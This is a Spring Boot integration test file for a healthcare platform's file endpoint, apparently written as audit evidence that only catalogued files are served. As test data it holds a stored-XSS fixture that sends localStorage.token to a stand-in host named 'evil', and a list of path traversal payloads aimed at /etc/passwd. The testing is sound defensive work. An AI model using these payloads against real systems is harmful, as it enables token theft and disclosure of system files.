package com.healthcare.herplatform.security;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.user;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;

import java.io.IOException;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.HttpHeaders;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;

import com.healthcare.herplatform.services.UserDetailsImpl;

/**
 * Evidence for audit finding V-02 (unbounded directory read on an authenticated endpoint).
 *
 * <p>Each test drives a real HTTP request through the full security filter chain and the real
 * {@link SecureFileCatalog}, against a real directory on disk. The directory is deliberately seeded
 * with a file that is <em>not</em> catalogued — {@code Patient Discharge Summary.pdf}, standing in
 * for the sort of thing an operator might one day drop in by hand — because the whole point of the
 * fix is that being present in the directory is no longer sufficient to be served.
 *
 * <p>The catalogue under test is the real one from {@code application.properties}, not a test
 * fixture, so these tests also fail if someone edits the catalogue and breaks a client contract.
 */
@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
class SecureFileAccessIT {

	/** A filename every client hard-codes. Renaming it in the catalogue breaks web and mobile. */
	private static final String CATALOGUED_PDF = "Physical Activity.pdf";
	private static final String CATALOGUED_VIDEO = "Warm Up Video.mp4";

	/** Present in the directory, absent from the catalogue. Must not be served. */
	private static final String UNCATALOGUED_BUT_ON_DISK = "Patient Discharge Summary.pdf";

	/** The stored-XSS carrier the old inline + probeContentType path would have executed. */
	private static final String UNCATALOGUED_ACTIVE_CONTENT = "note.html";

	private static final String NEVER_EXISTED = "No Such File.pdf";

	@Autowired
	private MockMvc mockMvc;

	@Autowired
	private SecureFileCatalog secureFileCatalog;

	@Value("${secure.files.base-path}")
	private String basePath;

	private Path baseDir;

	@BeforeEach
	void seedDirectory() throws IOException {
		baseDir = Paths.get(basePath).toAbsolutePath().normalize();
		Files.createDirectories(baseDir);

		write(CATALOGUED_PDF, "%PDF-1.4 catalogued education material");
		write(CATALOGUED_VIDEO, "not really an mp4, but the endpoint never looks");
		write(UNCATALOGUED_BUT_ON_DISK, "%PDF-1.4 SENSITIVE - must never be served");
		write(UNCATALOGUED_ACTIVE_CONTENT, "<script>fetch('//evil/'+localStorage.token)</script>");
	}

	private void write(String filename, String content) throws IOException {
		Files.write(baseDir.resolve(filename), content.getBytes(StandardCharsets.UTF_8));
	}

	// ---------------------------------------------------------------- allowed

	@Test
	@DisplayName("a catalogued filename is served as an attachment, nosniff, with the catalogue's type")
	void cataloguedFileIsServed() throws Exception {
		MvcResult result = mockMvc.perform(get("/api/auth/files/{filename}", CATALOGUED_PDF)
				.with(user(patient()))).andReturn();

		assertThat(result.getResponse().getStatus()).isEqualTo(200);
		assertThat(result.getResponse().getContentType()).isEqualTo("application/pdf");
		assertThat(result.getResponse().getHeader(HttpHeaders.CONTENT_DISPOSITION))
				.isEqualTo("attachment; filename=\"" + CATALOGUED_PDF + "\"");
		assertThat(result.getResponse().getHeader("X-Content-Type-Options")).isEqualTo("nosniff");
		assertThat(result.getResponse().getContentAsString())
				.contains("catalogued education material");
	}

	@Test
	@DisplayName("the videos the exercise schedule links keep working, typed from the catalogue")
	void cataloguedVideoIsServed() throws Exception {
		MvcResult result = mockMvc.perform(get("/api/auth/files/{filename}", CATALOGUED_VIDEO)
				.with(user(patient()))).andReturn();

		assertThat(result.getResponse().getStatus()).isEqualTo(200);
		// video/mp4 comes from the catalogue entry, not from the bytes -- the file seeded above is
		// not actually an mp4, and the endpoint neither knows nor cares.
		assertThat(result.getResponse().getContentType()).isEqualTo("video/mp4");
		assertThat(result.getResponse().getHeader("X-Content-Type-Options")).isEqualTo("nosniff");
	}

	@Test
	@DisplayName("every filename the shipped clients hard-code is in the catalogue")
	void everyClientFilenameIsCatalogued() {
		// These strings are compiled into the deployed web bundle and into the mobile app in the
		// stores. Dropping one from the catalogue is a production outage, not a test failure.
		List<String> hardCodedByClients = Arrays.asList(
				"Understanding Heart Disease.pdf",  // GeneralIVL.js, living_with_hd_screen.dart
				"Physical Activity.pdf",            // GeneralIVL.js, living_with_hd_screen.dart
				"Healthy Eating for The Heart.pdf", // GeneralIVL.js, living_with_hd_screen.dart
				"Stress and Lifestyle.pdf",         // PhyscoStressMgmt.js, living_with_hd_screen.dart
				"Cardiac Medication.pdf",           // HeartMedExplained.js, living_with_hd_screen.dart
				"Minimize Your Future Risk.pdf",    // RiskFactors.js, living_with_hd_screen.dart
				"Warm Up Video.mp4",                // ExerciseSched.js, cr_information_screen.dart
				"Circuit Video.mp4",                // ExerciseSched.js, cr_information_screen.dart
				"Cool Down Video.mp4");             // ExerciseSched.js, cr_information_screen.dart

		assertThat(secureFileCatalog.filenames()).containsAll(hardCodedByClients);
	}

	// ---------------------------------------------------------------- refused

	@Test
	@DisplayName("a file that exists in the directory but is not catalogued is refused, with no body")
	void uncataloguedFileOnDiskIsRefused() throws Exception {
		assertThat(Files.exists(baseDir.resolve(UNCATALOGUED_BUT_ON_DISK))).isTrue();

		MvcResult result = mockMvc.perform(get("/api/auth/files/{filename}", UNCATALOGUED_BUT_ON_DISK)
				.with(user(patient()))).andReturn();

		assertThat(result.getResponse().getStatus()).isEqualTo(403);
		assertThat(result.getResponse().getContentAsString()).isEmpty();
	}

	@Test
	@DisplayName("an HTML file in the directory is refused, closing the stored-XSS chain at the door")
	void uncataloguedActiveContentIsRefused() throws Exception {
		MvcResult result = mockMvc.perform(get("/api/auth/files/{filename}", UNCATALOGUED_ACTIVE_CONTENT)
				.with(user(patient()))).andReturn();

		assertThat(result.getResponse().getStatus()).isEqualTo(403);
		assertThat(result.getResponse().getContentAsString()).isEmpty();
	}

	@Test
	@DisplayName("a filename that does not exist is refused identically to one that does")
	void missingFileIsIndistinguishableFromUncatalogued() throws Exception {
		assertThat(Files.exists(baseDir.resolve(NEVER_EXISTED))).isFalse();

		MvcResult absent = mockMvc.perform(get("/api/auth/files/{filename}", NEVER_EXISTED)
				.with(user(patient()))).andReturn();
		MvcResult present = mockMvc.perform(get("/api/auth/files/{filename}", UNCATALOGUED_BUT_ON_DISK)
				.with(user(patient()))).andReturn();

		// The pair is the enumeration oracle. Status and body must match exactly, or a caller can
		// map out which names are real without ever being allowed to read one.
		assertThat(absent.getResponse().getStatus()).isEqualTo(403);
		assertThat(absent.getResponse().getStatus()).isEqualTo(present.getResponse().getStatus());
		assertThat(absent.getResponse().getContentAsString())
				.isEqualTo(present.getResponse().getContentAsString())
				.isEmpty();
	}

	@Test
	@DisplayName("traversal attempts, raw and encoded, never reach a file outside the directory")
	void traversalIsRefused() throws Exception {
		// Kept as an explicit list because the shapes matter: raw dot-dot, an encoded slash, a
		// fully encoded dot-dot, a double-encoded one, and the "....//" filter-bypass form.
		List<String> attempts = Arrays.asList(
				"../../etc/passwd",
				"..%2f..%2fetc%2fpasswd",
				"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
				"..%252f..%252fetc%252fpasswd",
				"....//....//etc/passwd");

		List<String> outcomes = new ArrayList<>();
		for (String attempt : attempts) {
			int status;
			String body;
			try {
				MvcResult result = mockMvc
						.perform(get(URI.create("/api/auth/files/" + attempt)).with(user(patient())))
						.andReturn();
				status = result.getResponse().getStatus();
				body = result.getResponse().getContentAsString();
			} catch (Exception rejectedBeforeTheController) {
				// Spring Security's StrictHttpFirewall rejects some of these shapes before the
				// controller is reached. That is a refusal too, and it is recorded as one rather
				// than swallowed, so this test cannot pass by never reaching the endpoint at all.
				status = 400;
				body = "";
			}
			outcomes.add(attempt + " -> " + status);
			assertThat(status).describedAs("traversal attempt %s", attempt).isNotEqualTo(200);
			assertThat(body).doesNotContain("root:");
		}

		// Printed so the audit evidence records what each shape actually did, not just that
		// nothing was served.
		System.out.println("V-02 traversal outcomes: " + outcomes);
		assertThat(outcomes).hasSameSizeAs(attempts);
	}

	@Test
	@DisplayName("an unauthenticated request is challenged, not served")
	void unauthenticatedIsRefused() throws Exception {
		MvcResult result = mockMvc.perform(get("/api/auth/files/{filename}", CATALOGUED_PDF)).andReturn();

		assertThat(result.getResponse().getStatus()).isEqualTo(401);
		assertThat(result.getResponse().getContentAsString())
				.doesNotContain("catalogued education material");
	}

	// ---------------------------------------------------------------- fixtures

	private static UserDetailsImpl patient() {
		List<GrantedAuthority> authorities =
				Collections.<GrantedAuthority>singletonList(new SimpleGrantedAuthority("ROLE_PATIENT"));
		return new UserDetailsImpl(101L, "patient101", "patient101@example.test", "Active", "9999-12-31",
				"irrelevant", authorities, "Test", "User");
	}
}
